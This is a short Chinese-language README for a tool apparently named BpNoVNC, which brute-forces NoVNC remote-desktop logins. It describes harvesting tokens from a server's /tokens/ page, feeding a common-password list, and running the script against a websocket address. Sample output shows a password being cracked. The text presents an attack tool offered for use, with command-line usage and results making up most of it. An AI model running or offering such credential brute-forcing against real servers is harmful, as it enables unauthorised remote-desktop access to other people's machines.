# BpNoVNC
爆破NoVNC

* token.txt:默认为空,通常在http://1.2.1.1:6080/tokens/ 页面复制到token.txt
* pass.txt:常用密码

```
python3 BpNoVNC.py -t ws://1.2.1.1:6080 -tf token.txt -pf pass.txt

[*]: ws://1.2.1.1:6080/?token=500a58ea-e1cc-b299-66d0-3001d6e10bff password:123123
[*]: ws://1.2.1.1:6080/?token=500a58ea-e1cc-b299-66d0-3001d6e10bff password:VNC
[-]: ws://1.2.1.1:6080/?token=500a58ea-e1cc-b299-66d0-3001d6e10bff password:123123
[+]: ws://1.2.1.1:6080/?token=500a58ea-e1cc-b299-66d0-3001d6e10bff password:VNC
```
